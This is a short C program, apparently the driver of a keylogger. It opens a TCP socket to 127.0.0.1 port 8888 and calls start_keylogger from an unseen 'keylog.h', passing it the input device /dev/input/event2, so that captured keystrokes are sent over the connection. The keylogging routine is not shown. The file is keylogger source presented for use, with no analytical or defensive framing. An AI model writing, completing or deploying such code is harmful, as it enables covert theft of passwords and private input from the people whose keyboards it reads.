#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include "keylog.h"  // Include the keylogger header

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Could not create socket\n");
        return 1;
    }
    printf("Socket created\n");

    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);  // Server port

    // Connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect failed. Error");
        return 1;
    }
    printf("Connected\n");

    // Start the keylogger and send keystrokes to server
    start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path

    // Close the socket
    close(sock);
    
    return 0;
}